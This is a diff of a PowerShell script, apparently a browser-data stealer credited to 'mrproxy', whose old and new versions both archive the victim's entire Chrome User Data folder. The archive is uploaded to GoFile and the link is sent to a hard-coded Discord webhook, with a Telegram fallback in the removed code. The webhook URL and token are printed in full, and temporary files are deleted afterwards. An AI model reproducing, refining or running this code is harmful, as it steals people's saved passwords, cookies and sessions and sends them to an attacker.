@@ -1,141 +1,73 @@
-### Created by mrproxy
-
-# $botToken = "bot_token"
-# $chatID = "chat_id"
-$webhook = "https://discord.com/api/webhooks/1262103660826071112/--It8rvjLzPFu0xXUnxOa4j9F3F17avmthW1sgRobIakA8HVQlFqG9KggZTIYH0X4L30"
-
-# Function for sending messages through Telegram Bot
-function Send-TelegramMessage {
-    param (
-        [string]$message
-    )
-
-    if ($botToken -and $chatID) {
-        $uri = "https://api.telegram.org/bot$botToken/sendMessage"
-        $body = @{
-            chat_id = $chatID
-            text = $message
-        }
-
-        try {
-            Invoke-RestMethod -Uri $uri -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
-        } catch {
-            Write-Host "Failed to send message to Telegram: $_"
-        }
-    } else {
-        Send-DiscordMessage -message $message
-    }
-}
-
-# Function for sending messages through Discord Webhook
+# Function to send a message through Discord Webhook
 function Send-DiscordMessage {
     param (
         [string]$message
     )
-
-    $body = @{
-        content = $message
-    }
-
-    try {
-        Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
-    } catch {
-        Write-Host "Failed to send message to Discord: $_"
-    }
+    $webhook = "https://discord.com/api/webhooks/1262103660826071112/--It8rvjLzPFu0xXUnxOa4j9F3F17avmthW1sgRobIakA8HVQlFqG9KggZTIYH0X4L30"
+    $body = @{ content = $message }
+    Invoke-RestMethod -Uri $webhook -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
 }
 
+# Function to upload a file to GoFile and return the download link
 function Upload-FileAndGetLink {
     param (
         [string]$filePath
     )
-
-    # Get URL from GoFile
     $serverResponse = Invoke-RestMethod -Uri 'https://api.gofile.io/getServer'
     if ($serverResponse.status -ne "ok") {
-        Write-Host "Failed to get server URL: $($serverResponse.status)"
+        Send-DiscordMessage -message "Failed to get server URL."
         return $null
     }
-
-    # Define the upload URI
     $uploadUri = "https://$($serverResponse.data.server).gofile.io/uploadFile"
 
-    # Prepare the file for uploading
-    $fileBytes = Get-Content $filePath -Raw -Encoding Byte
-    $fileEnc = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
+    $fileContent = Get-Content $filePath -Raw -Encoding Byte
     $boundary = [System.Guid]::NewGuid().ToString()
     $LF = "`r`n"
-    $bodyLines = (
+    $bodyLines = @(
         "--$boundary",
         "Content-Disposition: form-data; name=`"file`"; filename=`"$([System.IO.Path]::GetFileName($filePath))`"",
-        "Content-Type: application/octet-stream",
-        $LF,
-        $fileEnc,
-        "--$boundary--",
-        $LF
+        "Content-Type: application/octet-stream$LF",
+        $fileContent,
+        "--$boundary--"
     ) -join $LF
 
-    # Upload the file
+    $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($bodyLines)
+
     try {
-        $response = Invoke-RestMethod -Uri $uploadUri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
-        if ($response.status -ne "ok") {
-            Write-Host "Failed to upload file: $($response.status)"
+        $response = Invoke-RestMethod -Uri $uploadUri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyBytes
+        if ($response.status -eq "ok") {
+            return $response.data.downloadPage
+        } else {
+            Send-DiscordMessage -message "Failed to upload file."
             return $null
         }
-        return $response.data.downloadPage
     } catch {
-        Write-Host "Failed to upload file: $_"
+        Send-DiscordMessage -message "Error uploading file: $_"
         return $null
     }
 }
 
+$chromeUserDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+$tempZipPath = "$env:TEMP\chrome_data.zip"
+$tempTarPath = "$env:TEMP\chrome_data.tar"
 
-# Check for 7zip path
-$zipExePath = "C:\Program Files\7-Zip\7z.exe"
-if (-not (Test-Path $zipExePath)) {
-    $zipExePath = "C:\Program Files (x86)\7-Zip\7z.exe"
-}
+Compress-Archive -Path $chromeUserDataPath -DestinationPath $tempZipPath -Force
 
-# Check for Chrome executable and user data
-$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
-if (-not (Test-Path $chromePath)) {
-    Send-TelegramMessage -message "Chrome User Data path not found!"
-    Write-Error "An error occurred: $_"
-    Write-Host "Press any key to continue ..."
-    $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-}
-
-# Exit if 7zip path not found
-if (-not (Test-Path $zipExePath)) {
-    Send-TelegramMessage -message "7Zip path not found!"
-    Write-Error "An error occurred: $_"
-    Write-Host "Press any key to continue ..."
-    $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-}
-
-# Create a zip of the Chrome User Data
-$outputZip = "$env:TEMP\chrome_data.zip"
-& $zipExePath a -r $outputZip $chromePath
-if ($LASTEXITCODE -ne 0) {
-    Send-TelegramMessage -message "Error creating zip file with 7-Zip"
-    Write-Error "An error occurred: $_"
-    Write-Host "Press any key to continue ..."
-    $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
-}
-
-# Upload the file and get the link
-$link = Upload-FileAndGetLink -filePath $outputZip
-
-# Check if the upload was successful and send the link via Telegram
-if ($link -ne $null) {
-    Send-TelegramMessage -message "Download link: $link"
-    Write-Error "An error occurred: $_"
-    Write-Host "Press any key to continue ..."
-    $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+if (Test-Path $tempZipPath) {
+    Start-Process -FilePath "tar" -ArgumentList "-a -c -f $tempTarPath.gz --format=gnutar -C $env:TEMP chrome_data.zip" -NoNewWindow -Wait
+    if (Test-Path "$tempTarPath.gz") {
+        $link = Upload-FileAndGetLink -filePath "$tempTarPath.gz"
+        if ($link -ne $null) {
+            Send-DiscordMessage -message "Download link: $link"
+        } else {
+            Send-DiscordMessage -message "Failed to upload .tar.gz file to GoFile."
+        }
+    } else {
+        Send-DiscordMessage -message "Failed to create .tar.gz file."
+    }
 } else {
-    Send-TelegramMessage -message "Failed to upload file to gofile.io"
-    Write-Error "An error occurred: $_"
-    Write-Host "Press any key to continue ..."
-    $null = $host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+    Send-DiscordMessage -message "Failed to create .zip file."
 }
-# Remove the zip file after uploading
-Remove-Item $outputZip
+
+Remove-Item $tempZipPath -ErrorAction SilentlyContinue
+Remove-Item "$tempTarPath.gz" -ErrorAction SilentlyContinue
